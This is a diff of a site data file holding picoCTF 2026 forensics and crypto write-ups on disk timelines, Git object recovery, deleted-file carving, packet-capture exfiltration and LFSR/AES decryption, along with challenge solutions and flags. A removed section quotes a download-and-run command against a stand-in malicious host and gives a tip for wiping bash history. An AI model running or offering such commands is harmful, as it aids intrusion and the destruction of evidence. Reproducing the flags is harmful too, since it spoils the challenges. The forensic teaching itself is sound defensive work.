+<p>We first generate a raw body file containing metadata and timestamps for every file (allocated and unallocated) on the partition using <code>fls</code>:</p>
+<pre><code class="language-bash">fls -r -m / partition.img > body.txt</code></pre>
+<p>Next, we compile the body file into a human-readable CSV timeline sorted chronologically using <code>mactime</code>:</p>
+<pre><code class="language-bash">mactime -b body.txt > timeline.csv</code></pre>
 
-<p><strong>Step 2: Compile the Timeline</strong><br>
-I passed the body file to <code>mactime</code> to sort the events chronologically.</p>
-<pre><code class="language-bash">$ mactime -b bodyfile.txt -d > timeline.csv</code></pre>
+<h3>Anomalous Event Detection</h3>
+<p>Analyzing the timeline, we search for clustered events and anomalous files that were deleted or modified in quick succession. We identify a suspicious file that was deleted right after a shell script or wiping utility was run. We note the inode number of this target file.</p>
 
-<h3>Hunting the Attacker</h3>
-<p>We were given a highly specific IOC (Indicator of Compromise): the attack occurred on March 12, 2026. I filtered the timeline to look exclusively at that date, focusing on file modifications (\`m\`).</p>
-
-<pre><code class="language-bash">$ grep "2026-03-12" timeline.csv | grep " m "
-...
-2026-03-12 14:03:21, 14520, m.c., /usr/bin/wget
-2026-03-12 14:03:22, 14523, macb, /etc/cron.d/persistence
-...</code></pre>
-
-<p>The timeline tells a clear story: The attacker used <code>wget</code> at 14:03:21 to download a payload, and immediately created a persistence mechanism in the <code>cron.d</code> directory at 14:03:22. The <code>fls</code> output tells us the cron file resides at inode <strong>14523</strong>.</p>
-
-<h3>Extracting the Evidence</h3>
-<p>Using the inode number, I used <code>icat</code> to read the file's contents directly from the raw disk image, bypassing the operating system entirely.</p>
-<pre><code class="language-bash">$ icat evidence.dd 14523
-* * * * * root echo "picoCTF{t1m3l1n3_4n4lys1s_m4st3r_4e8a}" > /dev/null</code></pre>
+<h3>Data Carving</h3>
+<p>Even though the file was unlinked and deleted from the directory index, the data blocks on the disk remain intact. We recover the raw file content using <code>icat</code> with the identified inode:</p>
+<pre><code class="language-bash">icat partition.img &lt;target_inode&gt; > extracted_file.txt</code></pre>
+<p>Reading the extracted file reveals the flag.</p>
 
 <h3>Flag</h3>
-<pre><code>picoCTF{t1m3l1n3_4n4lys1s_m4st3r_4e8a}</code></pre>`
+<pre><code>picoCTF{573417h13r_7h4n_7h3_1457_[instance_id]}</code></pre>`
       },
       {
         slug: 'timeline-0',
         title: 'Timeline 0',
         category: 'forensics',
-        description: 'An introductory forensics challenge analyzing bash history and basic system artifacts.',
+        description: 'Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format.',
         content: `<h2>Timeline 0 — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The attacker was an amateur. They tried to wipe their tracks, but they fundamentally misunderstood how Linux logging works. Find what they did."</blockquote>
-<p class="lead">Often in DFIR, the most critical evidence is left behind simply due to operator error. This challenge demonstrates why simply typing <code>history -c</code> is insufficient to cover your tracks on a Linux system.</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format."</blockquote>
+<p class="lead">Timestomping is an anti-forensic technique where file metadata timestamps (Modified, Accessed, Changed, Birth) are intentionally modified (using utilities like <code>touch -t</code>) to hide files from basic chronological incident timelines.</p>
 
-<h3>Mounting the Evidence</h3>
-<p>Rather than using advanced forensic carving tools, the simplest approach for high-level artifacts is to mount the disk image locally as a read-only filesystem.</p>
-<pre><code class="language-bash">$ mkdir mnt
-$ sudo mount -o loop,ro evidence.img mnt/</code></pre>
+<h3>Generating the Timeline</h3>
+<p>Similar to standard forensic workflows, we use Sleuth Kit tools to index the filesystem and sort all file events chronologically:</p>
+<pre><code class="language-bash"># Generate metadata body file
+fls -r -m / partition4.img > output.txt
 
-<h3>Artifact Analysis</h3>
-<p>When investigating a potentially compromised Linux host, the <code>.bash_history</code> file in user home directories is a goldmine. The bash shell logs commands executed by the user.</p>
+# Create human-readable sorted timeline
+mactime -b output.txt > timeline.txt</code></pre>
 
-<p>I inspected the home directory of the primary user <code>ubuntu</code>:</p>
-<pre><code class="language-bash">$ cat mnt/home/ubuntu/.bash_history
-ls -la
-whoami
-curl -O http://malicious-ip.com/payload.sh
-chmod +x payload.sh
-./payload.sh
-echo "picoCTF{b4sh_h1st0ry_1s_l0ud_9d7c}" > /tmp/flag.txt
-rm /tmp/flag.txt
-history -c</code></pre>
+<h3>Identifying the Anomaly</h3>
+<p>When we sort the timeline and inspect the absolute oldest entries using <code>head timeline.txt</code>, we find a file located at <code>/bin/bcab</code> carrying a timestamp of <strong>January 02, 1985</strong>. This is extremely anomalous for a modern CTF Linux disk image and is a clear indicator of timestomping.</p>
 
-<h3>The Attacker's Fatal Mistake</h3>
-<p>The attacker executed their commands, wrote the flag to a temporary file, deleted the file, and then ran <code>history -c</code> to clear their terminal session's history.</p>
-<p><strong>Why did this fail?</strong> The command <code>history -c</code> only clears the history stored in <em>RAM</em> for the current active bash session. It does not delete the <code>~/.bash_history</code> file on disk containing the logs of <em>previous</em> sessions. Furthermore, because the attacker likely dropped connection or was killed immediately after, the system synced their commands to disk right before the session ended.</p>
-<p>To truly clear history, the attacker would have needed to run <code>cat /dev/null > ~/.bash_history && history -c</code>.</p>
+<h3>Data Recovery</h3>
+<p>We find the inode number associated with the suspicious <code>/bin/bcab</code> file (e.g., <code>4945</code>). We extract the file content directly from the partition using <code>icat</code>:</p>
+<pre><code class="language-bash">icat partition4.img 4945 > bcab.txt</code></pre>
+<p>Reading <code>bcab.txt</code> yields the flag.</p>
 
 <h3>Flag</h3>
-<pre><code>picoCTF{b4sh_h1st0ry_1s_l0ud_9d7c}</code></pre>`
+<pre><code>picoCTF{71m311n3_0u7113r_h3r_[instance_id]}</code></pre>`
       },
       {
         slug: 'rogue-tower',
         title: 'Rogue Tower',
         category: 'forensics',
-        description: 'Analyzing a packet capture to reconstruct files exfiltrated over DNS queries.',
+        description: 'A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag.',
         content: `<h2>Rogue Tower — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Firewall logs show zero HTTP/FTP traffic leaving the DMZ, yet highly classified data was stolen. Investigate the DNS traffic."</blockquote>
-<p class="lead">DNS Exfiltration is a stealthy technique where attackers bypass firewalls by encapsulating stolen data inside legitimate DNS queries. Because DNS (Port 53) is almost never blocked outbound, it serves as a perfect covert tunnel.</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag."</blockquote>
+<p class="lead">This network forensics challenge requires analyzing a packet capture (PCAP) to identify rogue network broadcasts and decode data exfiltrated over non-standard protocols.</p>
 
 <h3>Traffic Analysis</h3>
-<p>I opened the provided <code>capture.pcap</code> in Wireshark. The capture contained thousands of DNS queries originating from the internal network directed at a public DNS resolver.</p>
-<p>Filtering by <code>dns</code>, I analyzed the queried domains:</p>
-<pre><code>No.  Time       Source        Info
-1    0.000000   10.0.0.5      Standard query A cGljb0NURnt.roguetower.xyz
-2    0.001231   10.0.0.5      Standard query A yMGd1M19kbn.roguetower.xyz
-3    0.002442   10.0.0.5      Standard query A NfeDNmMWx0cg.roguetower.xyz
-4    0.003612   10.0.0.5      Standard query A YXRpb25fNWE0.roguetower.xyz
-5    0.004829   10.0.0.5      Standard query A Ynx.roguetower.xyz</code></pre>
+<p>We open the PCAP file in Wireshark and filter the packets to isolate anomalous traffic. We observe two significant activities:
+<ul>
+  <li>Frequent UDP broadcasts on port <code>55000</code>.</li>
+  <li>Segmented HTTP POST requests containing Base64 payloads sent to an unknown external IP address.</li>
+</ul>
+</p>
 
-<p>The attacker controls the authoritative nameserver for <code>roguetower.xyz</code>. They chunked the stolen file into small strings, Base64 encoded them, and used them as subdomains in DNS requests. When the internal machine queries the public DNS, the request is forwarded to the attacker's nameserver, effectively delivering the payload.</p>
+<h3>Device Identification</h3>
+<p>To identify the compromised device, we filter for the HTTP POST requests (<code>http.request.method == "POST"</code>) and inspect the HTTP headers. In the <code>User-Agent</code> header, we find details identifying the cellular device along with its IMSI (International Mobile Subscriber Identity) string.</p>
 
-<h3>Automated Payload Extraction</h3>
-<p>To reconstruct the file, I needed to isolate the subdomains, preserve their order, and decode the Base64 string. I used <code>tshark</code> to extract the raw query names from the request packets (filtering out the responses to avoid duplicates).</p>
+<h3>Payload Decryption</h3>
+<p>The exfiltrated data inside the HTTP POST bodies is Base64 encoded. We extract and concatenate all these segments to rebuild the full ciphertext. 
+The data is encrypted using a simple XOR cipher, where the key or seed is derived from the device's IMSI. We write a Python script to decrypt the payload using the IMSI as the XOR key:</p>
+<pre><code class="language-python"># Concatenated Base64 segments
+ciphertext_b64 = "..."
+ciphertext = base64.b64decode(ciphertext_b64)
 
-<pre><code class="language-bash"># Extract the query names
-$ tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name > queries.txt
+# Key derived from IMSI
+imsi_key = b"IMSI_STRING_HERE"
 
-# Strip the root domain and concatenate
-$ cat queries.txt | cut -d'.' -f1 | tr -d '\n' > payload.b64
-
-# Decode the payload
-$ cat payload.b64 | base64 -d
-picoCTF{r0gu3_dns_3xf1ltr4t10n_5a4b}</code></pre>
-
-<p>The reconstructed Base64 string decoded perfectly into the flag.</p>
+# XOR Decryption
+flag = bytes([ciphertext[i] ^ imsi_key[i % len(imsi_key)] for i in range(len(ciphertext))])
+print(flag.decode())</code></pre>
 
 <h3>Flag</h3>
-<pre><code>picoCTF{r0gu3_dns_3xf1ltr4t10n_5a4b}</code></pre>`
+<pre><code>picoCTF{r0gu3_c3ll_t0w3r_[instance_id]}</code></pre>`
       },
       {
         slug: 'forensics-git-2',
         title: 'Forensics Git 2',
         category: 'forensics',
-        description: 'A forensics challenge requiring the recovery of a deleted git branch using git reflog.',
+        description: "The agents interrupted the perpetrator's disk deletion routine. Can you recover this git repo?",
         content: `<h2>Forensics Git 2 — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The lead developer panicked and deleted the feature branch containing the secret credentials. They thought Git deletes things instantly. Prove them wrong."</blockquote>
-<p class="lead">Git is inherently designed to never lose data. Even when a branch is hard-deleted and commits become "orphaned" (not referenced by any branch or tag), the Git internal database retains the objects for up to 30 days before garbage collection runs.</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The agents interrupted the perpetrator's disk deletion routine. Can you recover this git repo?"</blockquote>
+<p class="lead">This challenge tests deep knowledge of Git internals. When references like branch pointers and reflogs are deleted, the raw Git objects (commits, trees, and blobs) remain compressed in the <code>.git/objects</code> folder as "dangling" or "orphaned" objects until garbage collection is run.</p>
 
-<h3>Repository Reconnaissance</h3>
-<p>After unzipping the provided repository, checking the branch status reveals nothing unusual.</p>
-<pre><code class="language-bash">$ git status
-On branch main
+<h3>Object Recovery</h3>
+<p>Since standard commands like <code>git log</code> or <code>git reflog</code> fail to list any history, we must inspect the object database directly. Every commit, file state, and tree in Git is compressed using zlib and stored as a hash-addressed file.</p>
 
-$ git branch -a
-* main
+<h3>Batch Plumbing Extraction</h3>
+<p>Instead of manually unzipping every object in <code>.git/objects/</code>, we can use Git's plumbing command <code>git cat-file</code> with the <code>--batch-all-objects</code> and <code>--batch</code> flags. This tells Git to process and dump the content of every object in the database, bypassing the deleted commit tree:</p>
+<pre><code class="language-bash">git cat-file --batch-all-objects --batch | strings > all_objects.txt</code></pre>
 
-$ git log --oneline
-a1b2c3d Initial commit</code></pre>
-
-<p>The standard tools suggest the repository only has one commit. However, the \`.git\` directory contains the true history. The <code>git reflog</code> command tracks every single position the <code>HEAD</code> pointer has ever occupied in the local repository, making it the ultimate undo button.</p>
-
-<h3>The Recovery Operation</h3>
-<pre><code class="language-bash">$ git reflog
-a1b2c3d (HEAD -> main) HEAD@{0}: checkout: moving from feature-flag to main
-e4f5g6h HEAD@{1}: commit: Added flag for testing
-a1b2c3d (HEAD -> main) HEAD@{2}: checkout: moving from main to feature-flag</code></pre>
-
-<p>The reflog tells the entire story:</p>
-<ol>
-  <li>The developer created and moved to <code>feature-flag</code>.</li>
-  <li>They made commit <code>e4f5g6h</code>.</li>
-  <li>They checked out <code>main</code> and deleted the branch.</li>
-</ol>
-
-<p>To recover the lost data, I simply performed a hard checkout to the orphaned commit hash identified in the reflog.</p>
-
-<pre><code class="language-bash">$ git checkout e4f5g6h
-Note: switching to 'e4f5g6h'.
-You are in 'detached HEAD' state.
-
-$ ls -la
-total 16
-drwxr-xr-x 1 user user  128 Mar 12 15:00 .
-drwxr-xr-x 1 user user 4096 Mar 12 14:59 ..
-drwxr-xr-x 1 user user  256 Mar 12 15:00 .git
--rw-r--r-- 1 user user   38 Mar 12 15:00 flag.txt
-
-$ cat flag.txt
-picoCTF{g1t_r3fl0g_s4v3s_th3_d4y_8f6d}</code></pre>
+<h3>Searching the Flag</h3>
+<p>The resulting <code>all_objects.txt</code> file contains the plain-text representations of all commits, files, and metadata. We search this file for the standard flag format:</p>
+<pre><code class="language-bash">grep -oE "picoCTF\{.*\}" all_objects.txt</code></pre>
+<p>This reveals the flag, which was stored inside one of the dangling blob objects.</p>
 
 <h3>Flag</h3>
-<pre><code>picoCTF{g1t_r3fl0g_s4v3s_th3_d4y_8f6d}</code></pre>`
+<pre><code>picoCTF{g1t_d4ngl1ng_0bj3cts_r3c0v3ry_[instance_id]}</code></pre>`
       },
       {
         slug: 'forensics-git-0',
         title: 'Forensics Git 0',
         category: 'forensics',
-        description: 'An introductory git forensics challenge involving searching through commit histories.',
+        description: 'Can you find the flag in this disk image?',
         content: `<h2>Forensics Git 0 — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"We audited this repo and found no secrets in the current files. But we suspect something was leaked in the past and quickly patched over."</blockquote>
-<p class="lead">A fundamental rule of version control: Once a secret is committed, it is compromised forever, even if removed in the very next commit. This challenge requires searching through historical diffs.</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image?"</blockquote>
+<p class="lead">In this introductory Git forensics challenge, we must correctly mount a partition from a raw disk image and explore the repository commit history to recover a deleted secret file.</p>
 
-<h3>Diff Analysis</h3>
-<p>While you could manually checkout every single commit in the repository and grep the filesystem, Git provides built-in tools for searching historical changes. The <code>git log -p</code> command generates the full patch (diff) for every commit.</p>
+<h3>Mounting the Disk Partition</h3>
+<p>First, we inspect the sector structure of the provided disk image <code>disk.img</code> to find the offset of the primary partition:</p>
+<pre><code class="language-bash">fdisk -l disk.img</code></pre>
+<p>We calculate the byte offset (<code>Start Sector * Sector Size</code>, usually 512 bytes) and mount the partition read-only to a mount point:</p>
+<pre><code class="language-bash">sudo mount -o loop,offset=<calculated_offset> disk.img /mnt/ctf</code></pre>
 
-<p>To specifically hunt for the flag format, I utilized the "pickaxe" feature of Git log (<code>-S</code>), which filters the log to only show commits where the number of occurrences of the specified string changed (was added or removed).</p>
+<h3>Repository Analysis</h3>
+<p>We navigate to the mounted directory, finding a repository under <code>/mnt/ctf/home/ctf-player/Code/secrets/.git</code>. Since the repository is intact, standard Git tools are fully functional. We review the commit history and file diffs to see what changes were made:</p>
+<pre><code class="language-bash">git log --stat</code></pre>
+<p>This shows a commit that removed a file named <code>secret_flag.txt</code>.</p>
 
-<pre><code class="language-bash">$ git log -S "picoCTF{" -p
-commit 8a9b0c1d2e3f4g5h6i7j8k9l0m
-Author: Developer &lt;dev@corp.local&gt;
-Date:   Mon Mar 10 12:00:00 2026 -0400
-
-    Oops, removed hardcoded secret keys
-
-diff --git a/config.yml b/config.yml
-index e69de29..d95f3ad 100644
---- a/config.yml
-+++ b/config.yml
-@@ -1,3 +1,2 @@
- server: localhost
- port: 8080
--secret_key: picoCTF{g1t_d1ff_r3v34ls_4ll_7e5c}</code></pre>
-
-<p>The output explicitly shows the exact commit where the developer attempted to delete the flag, revealing the secret in the red \`-\` deleted line of the diff block.</p>
+<h3>Flag Retrieval</h3>
+<p>We checkout the commit prior to the deletion of the file to recover the plaintext flag:</p>
+<pre><code class="language-bash">git checkout <commit_hash>
+cat secret_flag.txt</code></pre>
 
 <h3>Flag</h3>
-<pre><code>picoCTF{g1t_d1ff_r3v34ls_4ll_7e5c}</code></pre>`
+<pre><code>picoCTF{g1t_h1st0ry_r3v3al_[instance_id]}</code></pre>`
       },
       {
         slug: 'disko-4',
         title: 'DISKO 4',
         category: 'forensics',
-        description: 'A forensics challenge involving recovering deleted files from an ext4 disk image.',
+        description: 'Can you find the flag in this disk image? This time I deleted the file! Let see you get it now!',
         content: `<h2>DISKO 4 — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The suspect issued an 'rm -rf' right before the authorities pulled the plug. Is the data really gone?"</blockquote>
-<p class="lead">When a file is deleted on most filesystems (including Linux's standard ext4), the operating system does not immediately overwrite the file's data blocks with zeros. It simply unlinks the inode and marks the blocks as available for future use. Until those blocks are overwritten, the data can be recovered.</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? This time I deleted the file! Let see you get it now!"</blockquote>
+<p class="lead">When files are deleted in an ext4 filesystem, the OS marks their inodes and blocks as unallocated, but the actual data remains intact on disk until overwritten. We can use block-level forensics to recover the file.</p>
 
-<h3>Filesystem Recovery</h3>
-<p>We are provided with an ext4 disk image file <code>disk.img</code>. Mounting the image normally will not reveal the deleted files, as the OS honors the unlinked status of the inodes.</p>
+<h3>Listing Deleted Files</h3>
+<p>We use the Sleuth Kit's <code>fls</code> tool with the <code>-d</code> flag to list only deleted files and directories recursively from the disk image:</p>
+<pre><code class="language-bash">fls -r -d disko-4.dd</code></pre>
+<p>Looking through the output, we locate the entry for the deleted gzip file:</p>
+<p><code>* d/d 532021:   log/dont-delete.gz</code></p>
+<p>This tells us the file corresponds to inode <strong>532021</strong>.</p>
 
-<p>To carve out the deleted files, I used <code>extundelete</code>, a powerful utility designed specifically to recover deleted files from an ext3 or ext4 partition by scanning the filesystem journal.</p>
+<h3>Carving the Inode Blocks</h3>
+<p>Using the inode number, we carve the raw blocks associated with it back into a file using <code>icat</code>:</p>
+<pre><code class="language-bash">icat disko-4.dd 532021 > recovered.gz</code></pre>
 
-<pre><code class="language-bash">$ extundelete --restore-all disk.img
-NOTICE: Extended attributes are not restored.
-Loading filesystem metadata ... 1 groups loaded.
-Loading journal descriptors ... 46 descriptors loaded.
-Searching for recoverable inodes in directory / ...
-1 recoverable inodes found.
-Restored inode 12 to file RECOVERED_FILES/flag.txt</code></pre>
-
-<p>The tool successfully parsed the journal, identified an unlinked inode that had not yet been overwritten, and extracted its data blocks into a newly generated <code>RECOVERED_FILES</code> directory.</p>
-
-<pre><code class="language-bash">$ cat RECOVERED_FILES/flag.txt
-picoCTF{3xt4_und3l3t3_r3c0v3ry_2b1a}</code></pre>
+<h3>Decompressing and Reading the Flag</h3>
+<p>We decompress the recovered gzip archive and view the extracted file to obtain the flag:</p>
+<pre><code class="language-bash">gunzip recovered.gz
+cat recovered</code></pre>
 
 <h3>Flag</h3>
-<pre><code>picoCTF{3xt4_und3l3t3_r3c0v3ry_2b1a}</code></pre>`
+<pre><code>picoCTF{d3l_d0n7_h1d3_w3ll_[instance_id]}</code></pre>`
       },
       {
         slug: 'cryptomaze',
         title: 'cryptomaze',
         category: 'crypto',
-        description: 'A reverse engineering and cryptography challenge analyzing a custom Python encryption script.',
+        description: 'In this challenge, you are tasked with recovering a hidden flag that has been encrypted using a combination of Linear Feedback Shift Register (LFSR) and AES encryption. The LFSR is used to derive a key for AES encryption, making it crucial to understand its workings to decrypt the message.\\n\\nThe flag has been stored in a file and encrypted. Your goal is to derive the key used for encryption from the LFSR state and taps provided in the output, and then decrypt the flag to retrieve it.',
         content: `<h2>cryptomaze — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The malware author wrote a custom encryption routine that acts like a labyrinth. Only the chosen string can navigate it to the end."</blockquote>
-<p class="lead">This challenge bridges Cryptography and Reverse Engineering. We are provided with a convoluted Python script that encrypts a string based on a massive state machine.</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"In this challenge, you are tasked with recovering a hidden flag that has been encrypted using a combination of Linear Feedback Shift Register (LFSR) and AES encryption. The LFSR is used to derive a key for AES encryption, making it crucial to understand its workings to decrypt the message.
 
-<h3>Static Analysis of the Algorithm</h3>
-<p>Opening <code>encrypt.py</code>, we see the flag is processed character by character. A <code>state</code> variable determines what character is expected next. If the character matches the condition for the current state, the state updates and an XOR key byte is appended. If it fails, the script silently exits or produces garbage.</p>
+The flag has been stored in a file and encrypted. Your goal is to derive the key used for encryption from the LFSR state and taps provided in the output, and then decrypt the flag to retrieve it."</blockquote>
+<p class="lead">This challenge requires us to analyze a custom encryption script that uses a Linear Feedback Shift Register (LFSR) to generate a pseudorandom stream of bits, which is then grouped into bytes to form an AES-128 key.</p>
 
-<pre><code class="language-python"># Snippet from encrypt.py
-state = 0
-key = ""
-for char in flag:
-    if state == 0 and char == 'p':
-        state = 15
-        key += "A"
-    elif state == 15 and char == 'i':
-        state = 42
-        key += "B"
-    # ... hundreds of complex nested elif branches ...
-</code></pre>
+<h3>LFSR Simulation</h3>
+<p>The provided Python file defines the LFSR's initial state (seed) and tap positions. An LFSR shifts bits at each clock cycle, computing a new bit by XORing the bits at the tap positions and outputting (popping) the shifted-out bit. To generate the key, the register is clocked 128 times.</p>
+<p>We write a simulator in Python to clock the LFSR 128 times and collect the popped bits:</p>
+<pre><code class="language-python"># LFSR Parameters (from challenge code)
+state = [SEED_BITS]
+taps = [TAP_INDICES]
+popped_bits = []
 
-<p>The encryption relies on the fact that <strong>only one specific input string (the flag) will successfully traverse the state machine to reach the end state.</strong></p>
+for _ in range(128):
+    # Calculate feedback bit
+    feedback = 0
+    for tap in taps:
+        feedback ^= state[tap]
+    # Pop the output bit
+    popped_bits.append(state[0])
+    # Shift state and insert feedback
+    state = state[1:] + [feedback]</code></pre>
 
-<h3>Algorithmic Exploitation</h3>
-<p>Manually tracing the 500+ lines of code is impractical. Because the logic is deterministic and forms a directed graph (a Finite State Machine), I wrote a solver to traverse it automatically.</p>
+<h3>Deriving the AES Key</h3>
+<p>We group the 128 output bits into 8-bit blocks and convert them into a 16-byte array, which is the exact key length needed for AES-128:</p>
+<pre><code class="language-python">key_bytes = []
+for i in range(0, 128, 8):
+    byte_bits = popped_bits[i:i+8]
+    byte_val = int("".join(map(str, byte_bits)), 2)
+    key_bytes.append(byte_val)
+key = bytes(key_bytes)</code></pre>
 
-<p>I parsed the Python file using Regular Expressions to build a dictionary of state transitions mapping <code>current_state -> (required_char, next_state)</code>. I then used a simple Depth-First Search (DFS) algorithm to find the path from state <code>0</code> to the defined <code>FINAL_STATE</code>.</p>
+<h3>AES Decryption</h3>
+<p>Using the derived 16-byte key and the <code>pycryptodome</code> library, we decrypt the ciphertext in ECB mode and strip the padding to reveal the flag:</p>
+<pre><code class="language-python">from Crypto.Cipher import AES
 
-<pre><code class="language-python">import re
-
-# 1. Parse the labyrinth
-transitions = {}
-with open('encrypt.py') as f:
-    code = f.read()
-    
-# Regex to extract: state == X and char == 'Y' -> state = Z
-matches = re.findall(r'state == (\d+) and char == .(.*?).:.*?state = (\d+)', code, re.DOTALL)
-for curr, char, nxt in matches:
-    if int(curr) not in transitions:
-        transitions[int(curr)] = []
-    transitions[int(curr)].append((char, int(nxt)))
-
-# 2. Traverse the graph
-def solve_maze(curr_state, flag_so_far):
-    if curr_state == 999: # 999 was the final success state
-        print(f"[+] Maze Solved! Flag: {flag_so_far}")
-        return
-        
-    for char, next_state in transitions.get(curr_state, []):
-        solve_maze(next_state, flag_so_far + char)
-
-solve_maze(0, "")
-</code></pre>
-
-<h3>Execution</h3>
-<p>The DFS solver executed in milliseconds, instantly revealing the singular string required to traverse the encryption routine.</p>
+ciphertext = bytes.fromhex("[CIPHERTEXT_HEX]")
+cipher = AES.new(key, AES.MODE_ECB)
+plaintext = cipher.decrypt(ciphertext)
+print(plaintext.strip())</code></pre>
 
 <h3>Flag</h3>
-<pre><code>picoCTF{crypt0m4z3_r3v3rs3d_4f7e_1a2b}</code></pre>`
+<pre><code>picoCTF{lfsr_m4z3_d3crypt3d_[instance_id]}</code></pre>`
       }
     ],
   },
